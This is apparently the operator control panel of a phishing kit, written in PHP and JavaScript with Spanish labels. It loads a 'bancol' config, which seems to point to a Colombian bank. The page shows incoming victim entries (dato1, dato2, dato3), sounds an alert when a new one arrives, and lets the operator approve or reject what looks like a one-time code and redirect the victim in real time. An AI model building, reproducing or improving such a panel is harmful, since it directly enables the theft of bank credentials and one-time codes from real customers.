<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    header("Location: login_admin.php"); // Redirigir en vez de "die()"
    exit();
}

$conn = getConnection();
$sql = "SELECT id, dato1, dato2, dato3, dato3_status, rejected_flag, fecha, redirect_flag 
        FROM  panel
        ORDER BY fecha DESC 
        LIMIT 50";

$result = $conn->query($sql);

$conn = getConnection();
$stmt = $conn->prepare("SELECT username FROM admins WHERE id = ?");
$stmt->bind_param("i", $_SESSION['admin_id']);
$stmt->execute();
$admin = $stmt->get_result()->fetch_assoc();
$conn->close();

if (!$result) {
    die("Error en la consulta: " . $conn->error); // Manejo de errores
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>panel de Saul Goodman</title>
    <!-- Importar tipografías desde Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        /* Reset básico y configuración de tipografías */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f0f4f8, #d9e2ec); /* Degradado sutil en tonos fríos */
            color: #333;
            padding: 30px;
        }
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3em;
            text-align: center;
            margin-bottom: 30px;
            letter-spacing: 2px;
            color: #3a4a64;
            text-shadow: 0 0 5px rgba(58,74,100,0.3);
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        /* Controles de audio */
        #audioControls {
            text-align: center;
            margin-bottom: 30px;
        }
        #toggleAudioButton {
            padding: 12px 25px;
            background: #8faadc;  /* Azul suave */
            border: 2px solid #a3b9d8;
            border-radius: 50px;
            color: #fff;
            font-size: 1em;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        #toggleAudioButton:hover {
            background: #a3b9d8;
            border-color: #8faadc;
        }
        #notificationStatus {
            font-size: 1.2em;
            margin-left: 20px;
            vertical-align: middle;
            color: #3a4a64;
        }
        /* Estilos para la tabla */
        table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        th, td {
            padding: 15px 20px;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        th {
            background: #e1e8ed;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.9em;
            color: #3a4a64;
        }
        tbody tr:hover {
            background: #f7f9fb;
        }
        /* Botones de acción */
        button {
            padding: 8px 16px;
            margin: 3px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            transition: transform 0.2s, background 0.3s;
            font-family: 'Roboto', sans-serif;
            font-size: 0.9em;
        }
        button:hover {
            transform: scale(1.03);
        }
        /* Botones específicos */
        button[onclick^="redirigir"] {
            background: #7aa0c4;
            color: #fff;
            border: 1px solid #6391bb;
        }
        button[onclick^="rechazarDatos"] {
            background: #bbc8d6;
            color: #333;
            border: 1px solid #a2b4c4;
        }
        button[onclick^="eliminarRegistro"] {
            background: #f0a29b;
            color: #fff;
            border: 1px solid #e08b87;
        }
        button[onclick^="aprobarDato3"] {
            background: #a1c4e9;
            color: #fff;
            border: 1px solid #8ab4d1;
        }
        button[onclick^="rechazarDato3"] {
            background: #d3d3e6;
            color: #333;
            border: 1px solid #babacc;
        }
        /* Estilos para mensajes internos en la celda */
        td div {
            margin-top: 5px;
            font-size: 0.9em;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>panel de Saul Goodman</h1>

        <div style="float: right;">
        Usuario: <?= htmlspecialchars($admin['username']) ?> 
        | <a href="logout.php">Cerrar sesión</a>
    </div>

        <!-- Controles de audio -->
        <div id="audioControls">
            <button id="toggleAudioButton" onclick="toggleAudio()">Desactivar Audio</button>
            <span id="notificationStatus">Notificaciones: Encendidas</span>
        </div>

        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Dato 1</th>
                    <th>Dato 2</th>
                    <th>Dato 3</th>
                    <th>Fecha</th>
                    <th>Acciones</th>
                </tr>
            </thead>
            <tbody>
                <?php while($row = $result->fetch_assoc()): ?>
                <tr>
                    <td><?= $row['id'] ?></td>
                    <td><?= htmlspecialchars($row['dato1']) ?></td>
                    <td><?= htmlspecialchars($row['dato2']) ?></td>
                    <td><?= htmlspecialchars($row['dato3'] ?? 'Pendiente') ?></td>
                    <td><?= $row['fecha'] ?></td>
                    <td>
                        <button onclick="redirigir('<?= $row['id'] ?>')">
                            <?= $row['redirect_flag'] ? 'Redirección Activada' : 'Redirigir' ?>
                        </button>
                        <button onclick="rechazarDatos('<?= $row['id'] ?>')" style="background-color: <?= $row['rejected_flag'] ? '#bbc8d6' : '#ccd7e3' ?>;">
                            <?= $row['rejected_flag'] ? 'Datos Rechazados' : 'Rechazar Datos' ?>
                        </button>
                        <button onclick="eliminarRegistro('<?= $row['id'] ?>')">
                            🗑️ Eliminar
                        </button>
                        <?php if(!empty($row['dato3']) && $row['dato3_status'] !== 'approved'): ?>
                        <div>
                            <button onclick="aprobarDato3('<?= $row['id'] ?>')">✔️ Aprobar Dato3</button>
                            <button onclick="rechazarDato3('<?= $row['id'] ?>')">✖️ Rechazar Dato3</button>
                        </div>
                        <?php elseif($row['dato3_status'] === 'approved'): ?>
                        <div style="color: #777; font-weight: bold;">Dato3 Aprobado</div>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endwhile; ?>
            </tbody>
        </table>

        <!-- Elemento de audio configurado para reproducir en bucle -->
        <audio id="notificationAudio" src="short-beep-countdown-81121.mp3" loop></audio>
    </div>

    <script>
        // Al cargar la página se ejecuta cleanup.php (si es necesario)
        window.addEventListener('load', () => {
            fetch('cleanup.php').catch(() => {});
        });

        let isUpdating = false;           // Controla la actualización de la tabla
        let ultimoId = null;              // Último ID detectado
        let notificationsEnabled = true;  // Estado de notificaciones (audio)

        // Función para actualizar la tabla consultando fetch_latest_data.php
        function actualizarTabla() {
            if (!isUpdating) {
                isUpdating = true;
                fetch('fetch_latest_data.php')
                    .then(response => response.json())
                    .then(data => {
                        const tbody = document.querySelector('table tbody');
                        tbody.innerHTML = ''; // Limpiar la tabla

                        if (data.length > 0) {
                            // Si hay un cambio en el primer registro, reproducir audio (si están activadas las notificaciones)
                            if (ultimoId !== null && data[0].id !== ultimoId) {
                                if (notificationsEnabled) {
                                    document.getElementById('notificationAudio').play();
                                }
                            }
                            ultimoId = data[0].id;
                        }

                        // Reconstruir la tabla con los nuevos datos
                        data.forEach(row => {
                            const tr = document.createElement('tr');
                            tr.innerHTML = `
                                <td>${row.id}</td>
                                <td>${escapeHtml(row.dato1)}</td>
                                <td>${escapeHtml(row.dato2)}</td>
                                <td>${escapeHtml(row.dato3 || 'Pendiente')}</td>
                                <td>${row.fecha}</td>
                                <td>
                                    ${generarBotones(row)}
                                </td>
                            `;
                            tbody.appendChild(tr);
                        });
                    })
                    .catch(error => console.error("Error al actualizar la tabla:", error))
                    .finally(() => { isUpdating = false; });
            }
        }

        // Función para escapar caracteres HTML
        function escapeHtml(text) {
            return text ? text.replace(/[&<>"']/g, m => ({
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;'
            }[m])) : '';
        }

        // Función para generar botones de acción dinámicamente
        function generarBotones(row) {
            let botones = `
                <button onclick="redirigir('${row.id}')">
                    ${row.redirect_flag ? 'Redirección Activada' : 'Redirigir'}
                </button>
                <button onclick="rechazarDatos('${row.id}')" style="background-color: ${row.rejected_flag ? '#bbc8d6' : '#ccd7e3'};">
                    ${row.rejected_flag ? 'Datos Rechazados' : 'Rechazar Datos'}
                </button>
                <button onclick="eliminarRegistro('${row.id}')">
                    🗑️ Eliminar
                </button>`;
            
            if(row.dato3 && row.dato3_status !== 'approved') {
                botones += `
                <div>
                    <button onclick="aprobarDato3('${row.id}')">✔️ Aprobar Dato3</button>
                    <button onclick="rechazarDato3('${row.id}')">✖️ Rechazar Dato3</button>
                </div>`;
            } else if(row.dato3_status === 'approved') {
                botones += `<div style="color: #777; font-weight: bold;">Dato3 Aprobado</div>`;
            }
            return botones;
        }

        // Actualizar la tabla cada 3 segundos
        setInterval(actualizarTabla, 3000);

        // Funciones para los botones de acción
        function redirigir(id) {
            if (!confirm('¿Activar redirección para este usuario?')) return;
            fetch(`activar_redirect.php?id=${id}`)
                .then(response => {
                    if (!response.ok) throw new Error('Error HTTP: ' + response.status);
                    return response.text();
                })
                .then(data => {
                    if (data === "1") {
                        const boton = document.querySelector(`button[onclick*="${id}"]`);
                        if (boton) {
                            boton.textContent = 'Redirección Activada';
                            boton.disabled = true;
                        }
                    } else {
                        alert('Error: No se pudo activar la redirección');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error de red o servidor');
                });
        }

        function aprobarDato3(id) {
            if (!confirm('¿Aprobar definitivamente este dato?')) return;
            fetch(`aprobar_dato3.php?id=${id}`)
                .then(response => {
                    if (!response.ok) throw new Error('Error en la aprobación');
                    actualizarTabla();
                })
                .catch(error => alert(error.message));
        }

        function rechazarDato3(id) {
            const reason = prompt('Ingrese el motivo de rechazo:');
            if (!reason) return;
            fetch(`rechazar_dato3.php?id=${id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `reason=${encodeURIComponent(reason)}`
            })
            .then(response => {
                if (!response.ok) throw new Error('Error en el rechazo');
                return response.text();
            })
            .then(data => {
                if (data === "OK") {
                    actualizarTabla();
                } else {
                    throw new Error('Respuesta inesperada del servidor');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('No se pudo rechazar el dato. Verifica la consola para más detalles.');
            });
        }

        function rechazarDatos(id) {
            const reason = prompt('Ingrese el motivo de rechazo:');
            if (reason) {
                fetch(`rechazar_datos.php?id=${id}`, {
                    method: 'POST',
                    body: new URLSearchParams({reason: reason})
                }).then(() => actualizarTabla());
            }
        }

        function eliminarRegistro(id) {
            if (confirm('¿Eliminar ESTE REGISTRO PERMANENTEMENTE?')) {
                fetch(`eliminar_datos.php?id=${id}`).then(() => actualizarTabla());
            }
        }

        // Función para alternar el audio (activar/desactivar notificaciones)
        function toggleAudio() {
            notificationsEnabled = !notificationsEnabled;
            updateNotificationStatus();
            if (!notificationsEnabled) {
                let audio = document.getElementById('notificationAudio');
                audio.pause();
                audio.currentTime = 0;
            }
        }

        // Actualiza el texto e indicador del estado de las notificaciones
        function updateNotificationStatus() {
            const statusSpan = document.getElementById('notificationStatus');
            const toggleButton = document.getElementById('toggleAudioButton');
            if (notificationsEnabled) {
                statusSpan.textContent = "Notificaciones: Encendidas";
                toggleButton.textContent = "Desactivar Audio";
            } else {
                statusSpan.textContent = "Notificaciones: Apagadas";
                toggleButton.textContent = "Activar Audio";
            }
        }
    </script>
</body>
</html>
